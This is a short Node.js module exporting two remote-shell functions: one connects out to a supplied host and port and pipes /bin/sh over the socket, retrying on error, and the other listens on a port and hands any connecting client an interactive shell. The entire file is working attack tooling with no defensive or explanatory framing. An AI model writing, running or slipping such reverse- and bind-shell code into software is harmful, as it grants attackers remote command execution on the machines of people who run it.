var net = require('net');
var spawn = require('child_process').spawn;


var reverseShell = module.exports.reverseShell = function (host, port) {
    var timeout="5000";
    var client = new net.Socket();
    client.connect(port, host, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected\r\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
    });
    client.on('error', function(e) {
        setTimeout(reverseShell(host,port), timeout);
    });
}

var bindShell = module.exports.bindShell = function (port) {
    var server = net.createServer(function (c) {
        var sh = spawn('sh', ['-i']);
        c.pipe(sh.stdin);
        sh.stdout.pipe(c);
    });
    server.listen(port);
}
